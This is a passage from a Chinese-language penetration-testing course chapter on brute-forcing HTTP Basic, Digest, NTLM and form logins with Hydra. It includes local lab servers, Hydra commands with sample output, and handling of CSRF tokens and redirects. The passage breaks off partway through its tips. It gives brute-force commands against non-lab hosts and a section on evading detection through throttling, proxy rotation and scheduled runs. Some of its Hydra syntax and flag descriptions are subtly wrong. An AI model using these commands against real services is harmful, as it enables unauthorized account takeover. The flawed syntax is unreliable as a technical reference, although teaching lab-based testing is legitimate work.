# 第五章：使用 Hydra 攻击 HTTP 服务 🌐

> **课程编号**：ch05 | **难度**：⭐⭐ 初级 | **预计时间**：45 分钟
> 
> *HTTP 是互联网的基石，而 HTTP 认证机制则是保护 Web 资源的第一道防线。本章将带你深入了解 Hydra 如何对各种 HTTP 认证方式发起暴力破解攻击，以及如何有效防御这些攻击。*

---

## 📚 学习目标

完成本章学习后，你将能够：

1. **🎯 理解 HTTP 认证机制** — 准确区分 Basic、Digest、NTLM 和表单登录四种认证方式的原理与差异
2. **🔧 搭建实验靶场环境** — 独立构建 HTTP Basic Auth 靶机和表单登录靶机，为安全测试做好准备
3. **⚔️ 掌握 Hydra HTTP 模块** — 熟练使用 Hydra 的 `http-get`、`http-post-form` 等模块进行认证爆破
4. **🛡️ 处理复杂场景** — 解决 CSRF Token、自定义请求头、失败重定向等实际攻击中遇到的障碍
5. **🔒 设计防御策略** — 从速率限制、CAPTCHA、账户锁定等多个维度构建 Web 认证的纵深防御体系

---

## 🧠 背景知识

### 5.1 HTTP 认证概述

在日常上网时，你几乎每时每刻都在与 HTTP 认证打交道——登录邮箱、访问内网管理后台、调用 API 接口……这些场景的背后都涉及某种形式的身份验证。对于安全测试人员来说，理解 HTTP 认证的工作原理是进行 Web 安全评估的基础。

HTTP 认证的演进经历了多个阶段，从最早期简单粗暴的 Basic Auth，到安全性更高的 Digest Auth，再到微软生态中的 NTLM 认证，以及现代 Web 应用中最常见的表单登录。每一种认证方式都有其特定的安全特性，也各有其弱点。Hydra 作为一款功能强大的密码爆破工具，针对这些不同的认证方式提供了专门的攻击模块。

> ⚠️ **重要提示**：本章所有内容仅用于授权的安全测试和教学目的。未经授权对他人系统进行暴力破解属于违法行为。

---

### 5.2 HTTP Basic Authentication（基本认证）

#### 📖 工作原理

HTTP Basic Authentication 是最古老、最简单的 HTTP 认证方式，由 RFC 7617（原 RFC 2617）定义。其工作流程如下：

1. **客户端请求受保护资源**：用户尝试访问一个需要认证的 URL
2. **服务器返回 401 响应**：服务器响应 `HTTP/1.1 401 Unauthorized`，并在响应头中包含 `WWW-Authenticate: Basic realm="保护区域"` 和一个 `realm`（保护区域名称）
3. **客户端弹出认证框**：浏览器看到 401 响应后，弹出一个对话框要求用户输入用户名和密码
4. **客户端重新发送请求**：用户输入凭据后，浏览器将 `用户名:密码` 拼接在一起，进行 Base64 编码，然后放入请求头 `Authorization: Basic base64编码字符串` 中重新发送请求
5. **服务器验证凭据**：服务器解码 Base64 字符串，验证用户名和密码是否正确，正确则返回请求的资源

#### 🔍 认证流程图

```
客户端                              服务器
  |                                    |
  |  GET /protected HTTP/1.1          |
  | --------------------------------> |
  |                                    |
  |  HTTP/1.1 401 Unauthorized        |
  |  WWW-Authenticate: Basic          |
  |    realm="Admin Area"             |
  | <-------------------------------- |
  |                                    |
  |  GET /protected HTTP/1.1          |
  |  Authorization: Basic YWRtaW46cA  |
  | --------------------------------> |
  |                                    |
  |  HTTP/1.1 200 OK                  |
  |  [受保护的内容]                     |
  | <-------------------------------- |
```

#### ⚡ Base64 编码示例

假设用户名为 `admin`，密码为 `password123`：

```
拼接: admin:password123
Base64 编码: YWRtaW46cGFzc3dvcmQxMjM=
请求头: Authorization: Basic YWRtaW46cGFzc3dvcmQxMjM=
```

在命令行中可以进行编码验证：

```bash
echo -n "admin:password123" | base64
# 输出: YWRtaW46cGFzc3dvcmQxMjM=
```

#### ⚠️ 安全隐患

Basic Auth 存在几个严重的安全问题：

- **Base64 不是加密**：Base64 只是一种编码方式，任何人都可以轻松解码。如果没有 HTTPS 保护，凭据在网络中是明文传输的。
- **每次请求都发送凭据**：浏览器会在每一个后续请求中自动附带认证头，增加了凭据被截获的风险。
- **无法轻松注销**：浏览器会缓存 Basic Auth 凭据，用户关闭浏览器后凭据仍然有效。
- **无防暴力破解机制**：HTTP 协议层面没有内置的暴力破解防护，完全依赖应用层实现。

> 💡 **防御建议**：如果必须使用 Basic Auth，务必配合 HTTPS 使用，并在服务器端实现速率限制。

---

### 5.3 HTTP Digest Authentication（摘要认证）

#### 📖 工作原理

Digest Auth（RFC 7616）是为解决 Basic Auth 的安全问题而设计的。它不再明文传输密码，而是传输密码的"摘要"（哈希值）。其核心流程如下：

1. 客户端请求受保护资源
2. 服务器返回 401 响应，包含一个 `nonce`（随机数）和认证算法
3. 客户端使用 nonce、realm、用户名、密码、HTTP 方法、请求 URI 等信息计算出一个哈希值
4. 客户端将哈希值放入 `Authorization` 头中重新发送请求
5. 服务器使用相同的方式计算预期哈希值，进行比对

#### 🔑 摘要计算过程

Digest Auth 的响应值计算公式为：

```
HA1 = MD5(用户名:realm:密码)
HA2 = MD5(请求方法:URI)
response = MD5(HA1:nonce:HA2)
```

#### 🛡️ 相比 Basic Auth 的改进

- 密码不以明文传输（传输的是哈希值）
- 使用 nonce 防止重放攻击
- 支持 `qop`（Quality of Protection）提供更高级别的保护

#### ⚠️ 仍然存在的问题

- **容易受到中间人攻击**：如果不使用 HTTPS，攻击者可以修改服务器响应，降级为 Basic Auth 或使用较弱的加密算法
- **仍然可能离线爆破**：攻击者获取到 nonce、realm 等信息后，可以离线计算 MD5 哈希来爆破密码
- **存储的仍然是可逆哈希**：服务器需要存储密码的明文或等效的 HA1 值

---

### 5.4 NTLM Authentication（NT 局域网管理器认证）

#### 📖 工作原理

NTLM 是微软开发的一种认证协议，主要用于 Windows 环境和 IIS Web 服务器。它使用 Challenge-Response（挑战-响应）机制：

1. **协商（Negotiate）**：客户端发送 `NEGOTIATE_MESSAGE`，包含支持的功能列表
2. **挑战（Challenge）**：服务器生成一个 16 字节的随机数（Challenge），返回 `CHALLENGE_MESSAGE`
3. **认证（Authenticate）**：客户端使用密码的 NTLM Hash 对 Challenge 进行加密运算，返回 `AUTHENTICATE_MESSAGE`

#### 🔑 Hash 传递（Pass-the-Hash）

NTLM 认证的一个重要安全问题是 **Pass-the-Hash** 攻击。由于认证过程中传输的不是密码本身，而是密码的哈希值，攻击者如果能获取到 NTLM Hash，就可以直接用它来认证，无需知道原始密码。

```
NTLM Hash 计算:
MD4(UTF-16-LE(密码))
```

#### 🌐 在 HTTP 中的应用

当浏览器访问使用 NTLM 认证的 IIS 站点时，会自动进行 NTLM 握手。常见场景包括：

- Windows 域环境中的 SharePoint 站点
- 使用集成 Windows 认证的 IIS 站点
- 代理认证

---

### 5.5 表单登录（Form-Based Authentication）

#### 📖 工作原理

表单登录是现代 Web 应用中最常见的认证方式。与前面三种 HTTP 标准认证不同，表单登录完全在应用层实现：

1. **展示登录页面**：用户访问需要认证的页面时，被重定向到登录表单
2. **填写凭据**：用户在表单中输入用户名和密码
3. **提交表单**：表单通过 POST 请求将凭据发送到服务器
4. **服务器验证**：服务器验证凭据，成功则创建 Session 并设置 Cookie，失败则返回错误
5. **重定向**：成功后重定向到原始请求页面，后续请求通过 Cookie 中的 Session ID 维持登录状态

#### 🔍 表单登录的请求流程

```
客户端                              服务器
  |                                    |
  |  GET /dashboard HTTP/1.1          |
  | --------------------------------> |
  |                                    |
  |  302 Found                         |
  |  Location: /login                 |
  | <-------------------------------- |
  |                                    |
  |  GET /login HTTP/1.1              |
  | --------------------------------> |
  |                                    |
  |  200 OK [登录页面HTML]             |
  |  Set-Cookie: CSRF_TOKEN=abc123    |
  | <-------------------------------- |
  |                                    |
  |  POST /login HTTP/1.1             |
  |  username=admin&password=test123  |
  |  Cookie: CSRF_TOKEN=abc123        |
  | --------------------------------> |
  |                                    |
  |  302 Found                         |
  |  Location: /dashboard             |
  |  Set-Cookie: SESSION_ID=xyz789    |
  | <-------------------------------- |
```

#### 📋 关键参数分析

在使用 Hydra 进行表单爆破时，需要关注以下关键信息：

| 参数 | 说明 | 示例 |
|------|------|------|
| 登录 URL | 接收 POST 请求的地址 | `/login` 或 `/auth/signin` |
| 用户名字段 | 用户名对应的表单字段名 | `username`、`email`、`user` |
| 密码字段 | 密码对应的表单字段名 | `password`、`passwd`、`pwd` |
| 失败标识 | 登录失败时响应中的特征字符串 | `"Invalid credentials"`、`"登录失败"` |
| CSRF Token | 防跨站请求伪造的隐藏字段 | `_csrf`、`csrf_token` |
| Cookie 要求 | 是否需要携带特定 Cookie | `session` cookie |

#### 🆚 与标准 HTTP 认证的对比

```
HTTP Basic Auth:  服务器 401 → 客户端带 Authorization 头重试
HTTP Digest Auth: 服务器 401 + nonce → 客户端计算摘要后重试
NTLM Auth:        三步握手（Negotiate → Challenge → Authenticate）
表单登录:         用户手动填写表单 → POST 提交 → Session/Cookie 维持
```

---

### 5.6 Hydra 的 HTTP 模块详解

Hydra 提供了多个针对不同 HTTP 认证方式的模块，理解每个模块的用途和参数是有效使用 Hydra 的关键。

#### 📦 模块列表

| 模块名 | 认证类型 | 说明 |
|--------|----------|------|
| `http-get` | HTTP GET 表单 | 通过 GET 请求中的 URL 参数提交凭据 |
| `http-post-form` | HTTP POST 表单 | 通过 POST 请求体提交表单数据 |
| `http-head` | HTTP HEAD | 类似 GET 但只获取响应头 |
| `http-digest` | Digest 认证 | 针对 HTTP Digest Auth |
| `http-ntlm` | NTLM 认证 | 针对 NTLM Auth（Windows/IIS） |
| `http-basic` | Basic 认证 | 针对标准 HTTP Basic Auth（或使用 `-s` 端口自动检测） |

#### 🔧 模块语法格式

**`http-post-form` 模块语法：**

```
http-post-form://目标:端口/登录路径:用户名参数^密码参数^失败标识:可选参数
```

各部分含义：
- **目标:端口** — 目标地址和端口号
- **登录路径** — 处理登录请求的路径（如 `/login.php`）
- **用户名参数** — 表单中用户名字段的名称，Hydra 会自动替换为 `^USER^`
- **分隔符** — 使用 `^` 分隔各字段
- **密码参数** — 表单中密码字段的名称，Hydra 会自动替换为 `^PASS^`
- **失败标识** — 登录失败时响应中出现的字符串（Hydra 据此判断是否成功）
- **可选参数** — 额外参数，如自定义请求头、Cookie 等

**`http-get` 模块语法：**

```
http-get://目标:端口/路径?参数=值:失败标识:可选参数
```

**`http-digest` 模块语法：**

```
http-digest://目标:端口/路径
```

#### ⚙️ 常用附加选项

| 选项 | 说明 | 示例 |
|------|------|------|
| `H=Header:Value` | 添加自定义请求头 | `H="X-Custom: test"` |
| `C=Cookie` | 添加请求 Cookie | `C="session=abc123"` |
| `h=Header:Value` | 条件请求头（成功时才发送） | — |
| `user-agent=UA` | 自定义 User-Agent | `user-agent="Mozilla/5.0"` |
| `t=N` | 设置最大并发数 | `-t 4`（全局选项） |
| `w=秒` | 设置连接超时 | `-w 30` |

#### 📊 Hydra HTTP 攻击的工作流程

```
1. 加载用户名列表 ──┐
2. 加载密码列表 ───┼──> 3. 生成凭据组合
                    │
                    v
4. 对每个组合发送 HTTP 请求（GET/POST/Digest 等）
                    │
                    v
5. 分析响应 ──> 6. 是否包含失败标识？
                    │         │
                   是         否
                    │         │
                    v         v
               继续下一个    ✅ 记录成功凭据
```

---

## 🏗️ 实验环境

### 5.7 环境要求

#### 📋 硬件与软件清单

| 项目 | 最低要求 | 推荐配置 |
|------|----------|----------|
| 操作系统 | Kali Linux 2023+ / Ubuntu 22.04+ | Kali Linux 最新版 |
| 内存 | 2 GB | 4 GB+ |
| 磁盘空间 | 10 GB | 20 GB+ |
| 网络 | NAT 模式 | 仅主机模式 + NAT |
| Python | 3.8+ | 3.10+ |
| Hydra | 9.0+ | 最新版（9.5+） |

#### 🔧 安装 Hydra

在 Kali Linux 中，Hydra 已经预装：

```bash
# 检查 Hydra 版本
hydra -h | head -n 3
```

在 Ubuntu/Debian 上安装：

```bash
sudo apt update && sudo apt install hydra -y
```

从源码编译安装（获取最新版本）：

```bash
# 安装依赖
sudo apt install -y libssl-dev libssh-dev libgtk-3-dev build-essential

# 克隆源码
git clone https://github.com/vanhauser-thc/thc-hydra.git
cd thc-hydra

# 编译安装
./configure && make && sudo make install

# 验证安装
hydra -h
```

#### 📁 字典文件准备

```bash
# 创建实验用字典目录
mkdir -p ~/security-lab/dicts

# 使用系统自带的小型字典（快速实验）
ls /usr/share/wordlists/rockyou.txt.gz

# 解压 rockyou 字典（约 1400 万条密码，约 1.4GB）
sudo gzip -dk /usr/share/wordlists/rockyou.txt.gz

# 创建小型测试字典
cat > ~/security-lab/dicts/usernames.txt << 'EOF'
admin
administrator
root
user
test
guest
manager
operator
demo
EOF

cat > ~/security-lab/dicts/passwords.txt << 'EOF'
123456
password
admin
root
12345678
letmein
welcome
monkey
dragon
master
qwerty
login
princess
abc123
password1
EOF
```

---

### 5.8 搭建 HTTP Basic Auth 靶机

我们使用 Python 快速搭建一个 HTTP Basic Auth 靶机：

```python
# 保存为 basic_auth_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
from base64 import b64decode

# 配置有效的用户名和密码
VALID_USERS = {
    "admin": "admin123",
    "guest": "guest456",
    "operator": "op789"
}

class BasicAuthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        auth_header = self.headers.get("Authorization")
        
        if not auth_header or not auth_header.startswith("Basic "):
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="Secure Area"')
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<h1>401 Unauthorized</h1>")
            return
        
        try:
            credentials = b64decode(auth_header[6:]).decode("utf-8")
            username, password = credentials.split(":", 1)
        except Exception:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="Secure Area"')
            self.end_headers()
            self.wfile.write(b"<h1>401 Invalid Credentials</h1>")
            return
        
        if username in VALID_USERS and VALID_USERS[username] == password:
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(f"""
<html><body>
<h1>Welcome, {username}!</h1>
<p>Secret data: FLAG_BASIC_AUTH_SUCCESS_2024</p>
</body></html>
""".encode("utf-8"))
            print(f"[+] Successful login: {username}")
        else:
            self.send_response(401)
            self.send_header("WWW-Authenticate", 'Basic realm="Secure Area"')
            self.end_headers()
            self.wfile.write(b"<h1>401 Unauthorized</h1>")
            print(f"[-] Failed login: {username}:{password}")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8080), BasicAuthHandler)
    print("HTTP Basic Auth Target running on port 8080")
    server.serve_forever()
```

#### 🚀 启动与验证靶机

```bash
# 启动靶机
python3 ~/security-lab/basic_auth_server.py &

# 测试无认证访问（应返回 401）
curl -v http://localhost:8080/ 2>&1 | grep "HTTP/"

# 测试正确凭据
curl -v -u admin:admin123 http://localhost:8080/
# 预期：200 OK + Welcome, admin!

# 测试错误密码
curl -v -u admin:wrongpass http://localhost:8080/
# 预期：401 Unauthorized
```

---

### 5.9 搭建表单登录靶机

```python
# 保存为 form_login_server.py
from http.server import HTTPServer, BaseHTTPRequestHandler
import secrets
import urllib.parse

VALID_USERS = {
    "admin": "password123",
    "user": "user123",
    "test": "test123"
}

csrf_tokens = {}

class FormLoginHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path in ("/", "/login"):
            csrf_token = secrets.token_hex(16)
            csrf_tokens[csrf_token] = True
            html = f"""<!DOCTYPE html><html><body>
<h2>User Login</h2>
<form method="POST" action="/login">
<input type="hidden" name="csrf_token" value="{csrf_token}" />
Username: <input type="text" name="username" /><br/>
Password: <input type="password" name="password" /><br/>
<button type="submit">Login</button>
</form></body></html>"""
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(html.encode("utf-8"))
        elif self.path == "/dashboard":
            self.send_response(200)
            self.send_header("Content-Type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(b"<h1>Dashboard - FLAG_FORM_LOGIN_SUCCESS_2024</h1>")
    
    def do_POST(self):
        if self.path == "/login":
            length = int(self.headers.get("Content-Length", 0))
            data = urllib.parse.parse_qs(self.rfile.read(length).decode())
            username = data.get("username", [""])[0]
            password = data.get("password", [""])[0]
            csrf = data.get("csrf_token", [""])[0]
            
            print(f"[*] Attempt: {username}:{password}")
            
            if username in VALID_USERS and VALID_USERS[username] == password:
                self.send_response(302)
                self.send_header("Location", "/dashboard")
                self.send_header("Set-Cookie", "session=authenticated")
                self.end_headers()
                print(f"[+] SUCCESS: {username}")
            else:
                error = "<h2>Login Failed</h2><p>Invalid credentials</p>"
                self.send_response(200)
                self.send_header("Content-Type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(error.encode("utf-8"))
                print(f"[-] FAILED: {username}:{password}")

if __name__ == "__main__":
    server = HTTPServer(("0.0.0.0", 8081), FormLoginHandler)
    print("Form Login Target running on port 8081")
    server.serve_forever()
```

```bash
python3 ~/security-lab/form_login_server.py &

# 验证
curl -s http://localhost:8081/login | grep "input"

# 手动 POST 测试
curl -s -X POST http://localhost:8081/login \
  -d "username=admin&password=wrong&csrf_token=dummy"
# 预期：Login Failed
```

---

## ⚔️ 实验步骤

### 任务 1：HTTP Basic Auth 爆破 🎯

#### 目标
使用 Hydra 爆破 HTTP Basic Auth 靶机，找到有效的管理员凭据。

#### 步骤 1：确认目标信息

```bash
# 使用 curl 探测认证类型
curl -v http://localhost:8080/ 2>&1 | grep -i "www-authenticate"
```

预期输出：
```
< WWW-Authenticate: Basic realm="Secure Area"
```

#### 步骤 2：单用户爆破

```bash
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8080 http-get /
```

参数说明：
- `-l admin` — 指定单个用户名（小写 l）
- `-P passwords.txt` — 指定密码字典（大写 P）
- `localhost` — 目标主机
- `-s 8080` — 指定端口
- `http-get /` — 使用 http-get 模块，路径为 `/`

预期输出：
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak

[DATA] max 16 tasks per 1 server, overall 16 tasks, 15 login tries (l:1/p:15)
[DATA] attacking http-get://localhost:8080/
[8080][http-get] host: localhost   login: admin   password: admin123
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2024-xx-xx xx:xx:xx
```

> 🎉 **成功！** 找到凭据 `admin:admin123`。

#### 步骤 3：用户名+密码字典模式

```bash
hydra -L ~/security-lab/dicts/usernames.txt \
  -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8080 http-get /
```

预期输出：
```
[8080][http-get] host: localhost   login: admin      password: admin123
[8080][http-get] host: localhost   login: guest      password: guest456
[8080][http-get] host: localhost   login: operator   password: op789
3 of 1 target successfully completed, 3 valid passwords found
```

#### 步骤 4：调整并发与超时

```bash
# 降低并发数避免触发防护，开启详细输出
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8080 http-get / \
  -t 4 -w 30 -v -o results/basic_auth_results.txt

# 参数说明：
# -t 4  : 每目标最大4个并发线程（默认16）
# -w 30 : 连接超时30秒
# -v    : 显示每次尝试
# -o    : 输出结果到文件
```

查看结果：
```bash
cat results/basic_auth_results.txt
# localhost:8080:http-get:/:admin:admin123
```

---

### 任务 2：POST 表单登录爆破 📝

#### 目标
使用 `http-post-form` 模块爆破表单登录靶机。

#### 步骤 1：分析登录表单

```bash
curl -s http://localhost:8081/login | grep -E "input|form"
```

关键输出：
```html
<form method="POST" action="/login">
<input type="hidden" name="csrf_token" value="..." />
<input type="text" name="username" />
<input type="password" name="password" />
```

我们需要的关键信息：
- **登录 URL**：`/login`
- **POST 方法**
- **用户名字段**：`username`
- **密码字段**：`password`
- **CSRF 字段**：`csrf_token`（先忽略，后续处理）
- **失败标识**：`Login Failed`（从错误页面中提取）

#### 步骤 2：手动 POST 测试

```bash
# 发送一个手动 POST 请求，观察失败响应
curl -s -v -X POST http://localhost:8081/login \
  -d "username=admin&password=wrong&csrf_token=test123" 2>&1 | tail -10
```

预期输出：
```
< HTTP/1.1 200 OK
<h2>Login Failed</h2><p>Invalid credentials</p>
```

#### 步骤 3：使用 Hydra 爆破（忽略 CSRF）

```bash
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8081 http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf_token=fake123:Login Failed"
```

**语法拆解：**

```
http-post-form "/login            ← POST 目标路径
  :username=^USER^                ← 用户名字段（^USER^ 由 Hydra 自动替换）
  &password=^PASS^                 ← 密码字段（^PASS^ 由 Hydra 自动替换）
  &csrf_token=fake123              ← CSRF 字段填入假值
  :Login Failed"                  ← 失败标识字符串（响应中包含此字符串 = 登录失败）
```

> ⚠️ **注意**：这里 CSRF token 使用了假值。在本例中，靶机的 CSRF 校验逻辑较为宽松（仅检查 token 是否存在），所以攻击可以成功。在实际场景中，通常需要处理动态 CSRF token（见任务 3）。

预期输出：
```
[DATA] attacking http-post-form://localhost:8081/login:/
[8081][http-post-form] host: localhost   login: admin   password: password123
1 of 1 target successfully completed, 1 valid password found
```

#### 步骤 4：多用户爆破

```bash
hydra -L ~/security-lab/dicts/usernames.txt \
  -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8081 http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf_token=fake123:Login Failed" \
  -t 4
```

---

### 任务 3：处理 CSRF Token 🛡️

#### 背景

现代 Web 应用通常使用 CSRF Token 来防止跨站请求伪造攻击。这给 Hydra 的自动化爆破带来了挑战，因为每次请求的 CSRF Token 都可能不同。

#### 方案 1：先获取 Token 再爆破（手动方式）

```bash
# 步骤1：获取 CSRF Token
CSRF=$(curl -s http://localhost:8081/login | grep -o 'csrf_token" value="[^"]*"' | cut -d'"' -f3)
echo "CSRF Token: $CSRF"

# 步骤2：手动测试带 Token 的请求
curl -s -X POST http://localhost:8081/login \
  -d "username=admin&password=password123&csrf_token=$CSRF"
```

#### 方案 2：使用 Burp Suite 代理抓包分析

```bash
# 配置 Hydra 使用 Burp Suite 代理（调试模式）
# 在 Burp Suite 中监听 127.0.0.1:8080
# 然后让 Hydra 通过代理访问目标

# 注意：需要修改靶机端口避免冲突
python3 ~/security-lab/form_login_server.py --port 8082 &

hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8082 http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf_token=fake:Login Failed" \
  -v
```

#### 方案 3：自定义失败标识匹配重定向

有些应用在登录成功后返回 `302 重定向`，此时不能简单地用响应体字符串做判断：

```bash
# 使用 "F=Response Header" 匹配 HTTP 状态码
# 注意：Hydra 的 http-post-form 模块默认检查响应体中的字符串
# 如果目标是302重定向，需要检查 Location 头

# 方法：将失败标识设为登录失败页面的唯一字符串
# 或使用 F= 选项匹配特定响应头
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8081 http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf_token=fake123:S=302"
```

> 💡 **小贴士**：`S=302` 表示当 HTTP 状态码为 302 时判定为登录成功（成功重定向）。这是处理重定向登录的常用技巧。

---

### 任务 4：自定义请求头 📨

#### 背景

某些 Web 应用可能检查特定的请求头，例如：
- `User-Agent` 白名单
- `Referer` 检查
- 自定义 `X-Requested-With` 头
- API 密钥或 Token 头

#### 步骤 1：添加自定义 User-Agent

```bash
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8080 http-get / \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

#### 步骤 2：同时添加多个自定义头

```bash
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8081 http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf_token=fake123:Login Failed" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
  -H "Referer: http://localhost:8081/login" \
  -H "X-Requested-With: XMLHttpRequest"
```

#### 步骤 3：带 Cookie 的认证请求

```bash
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8081 http-post-form \
  "/login:username=^USER^&password=^PASS^&csrf_token=fake123:Login Failed" \
  -C "session=initial_session_value; lang=zh-CN"
```

#### 步骤 4：实战 — 攻击带 Referer 检查的表单

```bash
# 有些应用会检查 Referer 是否来自合法页面
# 使用 -H 添加 Referer 头绕过检查
hydra -L ~/security-lab/dicts/usernames.txt \
  -P ~/security-lab/dicts/passwords.txt \
  target.example.com -s 443 http-post-form \
  "/api/auth/login:email=^USER^&pass=^PASS^:Invalid credentials" \
  -H "User-Agent: Mozilla/5.0" \
  -H "Referer: https://target.example.com/login" \
  -H "Origin: https://target.example.com" \
  -t 2 -w 30
```

---

### 任务 5：使用 Digest Auth 模块 🔐

#### 背景

如果你的目标是使用了 HTTP Digest 认证的服务器，使用 `http-digest` 模块：

```bash
# Digest Auth 爆破
hydra -l admin -P ~/security-lab/dicts/passwords.txt \
  localhost -s 8080 http-digest /

# 与 Basic Auth 的区别：不需要手动构造 Authorization 头
# Hydra 会自动处理 nonce 和摘要计算
```

#### 对比 Basic Auth 和 Digest Auth 攻击

| 特性 | Basic Auth 攻击 | Digest Auth 攻击 |
|------|----------------|-----------------|
| Hydra 模块 | `http-get` / `http-head` | `http-digest` |
| 凭据传输 | Base64 编码（可解码） | MD5 哈希（不可逆） |
| 每次请求开销 | 低 | 较高（需计算 MD5 摘要） |
| 抗嗅探能力 | 弱（明文 Base64） | 中（需抓取 nonce 才能离线爆破） |
| Hydra 攻击速度 | 快 | 较慢（需计算） |
| 常见部署 | 路由器管理页面、嵌入式设备 | Apache/Nginx 的 `.htpasswd`、代理认证 |

#### 步骤 2：NTLM Auth 攻击（IIS 场景）

```bash
# 针对使用 NTLM 认证的 IIS 服务器
hydra -l administrator -P ~/security-lab/dicts/passwords.txt \
  192.168.1.100 http-ntlm /

# 注意：NTLM 认证需要三步握手，速度比 Basic Auth 慢
# 通常用于 Windows 域环境中的 IIS 站点
```

---

## 💡 解题技巧

### 技巧 1：使用浏览器开发者工具分析表单 🔍

在进行 Hydra 爆破之前，先用浏览器开发者工具完整分析登录流程：

1. 打开 Chrome/Firefox 开发者工具（F12）
2. 切换到 **Network（网络）** 标签
3. 勾选 **Preserve log（保留日志）**
4. 输入错误的用户名和密码提交登录
5. 查找 POST 请求，点击查看详情
6. 在 **Headers（请求头）** 中找到：
   - `Request URL` — 登录请求的完整路径
   - `Content-Type` — 通常为 `application/x-www-form-urlencoded`
   - `Form Data` — 所有提交的参数（包括隐藏字段）
7. 在 **Response（响应）** 中找到：
   - 失败时的特征字符串（用作 Hydra 的失败标识）

```bash
# 也可以用 curl 快速分析
curl -v -X POST http://target/login -d "username=test&password=test" 2>&1 | grep -E "< HTTP|< Location|< Set-Cookie"
```

### 技巧 2：正确选择失败标识 🎯

失败标识的选择直接决定了爆破是否有效：

```bash
# ✅ 好的失败标识（在所有失败响应中都存在，在成功响应中不存在）
"Invalid username or password"
"登录失败"
"Authentication failed"
"错误：用户名或密码不正确"

# ❌ 不好的失败标识
"password"              # 太常见，可能出现在成功页面中
"error"                 # 太宽泛
"login"                 # 可能出现在重定向URL中

# 🔧 如何确定最佳失败标识？
# 1. 分别用错误凭据和正确凭据登录，对比响应差异
# 2. 选择只在失败响应中出现的字符串
# 3. 字符串越具体越好
```

### 技巧 3：使用 HTTPS 和 SSL/TLS 🔒

```bash
# 攻击 HTTPS 目标（Hydra 自动处理 SSL）
hydra -l admin -P passwords.txt target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:Login Failed"

# 如果遇到 SSL 证书错误，可以跳过验证（仅限测试环境）
hydra -l admin -P passwords.txt target.com https-post-form \
  "/login:username=^USER^&password=^PASS^:Login Failed" \
  -V  # 或者使用 -vV

# 如果目标使用自签名证书
hydra -l admin -P passwords.txt 192.168.1.100 -s 8443 https-post-form \
  "/login:user=^USER^&pass=^PASS^:失败" \
  -w 60  # 自签名证书可能需要更长超时
```

### 技巧 4：处理 302 重定向的登录 🔄

很多应用在登录成功后返回 302 重定向，而不是 200 OK：

```bash
# 方法1：使用 S=302 作为成功判断（状态码302表示成功）
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:S=302"

# 方法2：使用 F= 标记失败（在失败响应中查找特征字符串）
# 当响应不包含失败标识时，Hydra 默认认为成功
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:username=^USER^&password=^PASS^:F=<html>"

# 方法3：关注 Location 头
# 登录成功 → Location: /dashboard
# 登录失败 → Location: /login?error=1
```

### 技巧 5：编写高效的字典 📖

```bash
# 1. 基于目标信息定制字典
# 如果目标是一个中文网站，优先尝试常见中文密码
cat >> passwords.txt << 'EOF'
123456
12345678
admin123
password1
woaini
iloveyou
woaini1314
EOF

# 2. 基于社工信息生成字典（cewl 工具）
# 从目标网站爬取关键词作为密码字典
cewl http://target.com -d 2 -m 5 -w wordlist.txt
# 参数：-d 爬取深度，-m 最小词长，-w 输出文件

# 3. 使用 crunch 生成规则化字典
crunch 8 12 abcdefghijklmnopqrstuvwxyz -o wordlist.txt

# 4. 使用 hashcat 规则扩展字典
# 对基础字典应用变换规则（大小写、替换、追加等）
hashcat --force passwords.txt -r /usr/share/hashcat/rules/best64.rule --stdout > expanded.txt
```

### 技巧 6：避免被检测到的策略 🕵️

```bash
# 1. 降低并发线程
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" -t 1

# 2. 增加请求间隔（使用 -w 增加超时模拟延迟）
hydra -l admin -P passwords.txt target.com http-post-form \
  "/login:user=^USER^&pass=^PASS^:failed" -t 1 -w 10

# 3. 随机化 User-Agent（每轮使用不同 UA）
# Hydra 本身不支持随机 UA，但可以写脚本配合使用

# 4. 使用代理轮换
# 准备一个代理列表 proxy_list.txt
# 格式：每行一个代理（host:port）
# 然后配合 proxychains 或 medusa 使用

# 5. 分时段攻击
# 将大字典拆分成多个小文件，分时段执行
split -l 1000 large_passwords.txt chunk_
for chunk in chunk_*; do
  hydra -l admin -P $chunk target.com http-post-form \
    "/login:user=^USER^&pass=^PASS^:failed" -t 2
  sleep 300  # 每轮间隔5分钟
  done

# 6. 先用小字典测试
